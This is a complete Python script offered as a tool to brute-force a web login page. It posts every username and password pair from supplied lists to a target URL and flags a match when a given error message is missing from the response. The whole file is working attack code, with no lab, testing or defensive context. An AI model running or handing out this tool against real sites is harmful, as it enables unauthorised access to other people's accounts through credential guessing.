#!/usr/bin/env python3

from bs4 import BeautifulSoup
import requests
import argparse

parser = argparse.ArgumentParser(description='Brute Force a login page.')
parser.add_argument('-u', '--url', required=True, help='Target url!')
parser.add_argument('-r', '--response', required=True, help='The response of an error message')
#parser.add_argument('-l', '--login', required=True, help='Set username!')
user = parser.add_mutually_exclusive_group(required=True)
user.add_argument('-l', '--login', help='Set username!')
user.add_argument('-L', '--loginlist', help='Set username list!')
password = parser.add_mutually_exclusive_group(required=True)
password.add_argument('-p', '--password', help='Set password!')
password.add_argument('-P', '--passwordlist', help='Set password list!')
args = parser.parse_args()



url = args.url
login_username = args.login
login_username_list = args.loginlist
login_password = args.password
login_password_list = args.passwordlist


def login(username,password):
    r = requests.post(url, data = {
        "username": username,
        "password": password,
        "submit": "Login",
        })
    return r



def main():
    if login_username_list:
        

            with open(login_username_list, "r") as i:
                usernames = [ line.strip() for line in i.read().split("\n") if line ]

            for username in usernames: 
                

                if login_password_list:

                    with open(login_password_list, "r") as h:
                        passwords = [ line.strip() for line in h.read().split("\n") if line ]

                    for password in passwords:
                        #html_content = login("admin", password).text
                        #soup = BeautifulSoup(html_content, "lxml")
                        #response = soup.form.text
                        response = login(username, password).text            
                            
                        if args.response in response:
                            print(f"username {username} password {password}: Incorrect Password")
                        else:
                            print(f"username {username}, password {password}: Correct Password")
                            return
                            

                else:
                    response = login(username, login_password).text

                    if args.response in response:
                        print(f"username {username} password {login_password}:Incorrect Password")
                    else:
                        print(f"username {username} password {login_password}:Correct Password")
                        
                        
    else:

        if login_password_list:

                with open(login_password_list, "r") as h:
                    passwords = [ line.strip() for line in h.read().split("\n") if line ]

                for password in passwords:
                    #html_content = login("admin", password).text
                    #soup = BeautifulSoup(html_content, "lxml")
                    #response = soup.form.text
                    response = login(login_username, password).text            
                        
                    if args.response in response:
                        print(f"username {login_username} password {password}: Incorrect Password")
                    else:
                        print(f"username {login_username}, password {password}: Correct Password")
                        return
                        
                        

        else:
            response = login(login_username, login_password).text

            if args.response in response:
                print(f"username {login_username} password {login_password}:Incorrect Password")
            else:
                print(f"username {login_username} password {login_password}:Correct Password")
            
            
main()

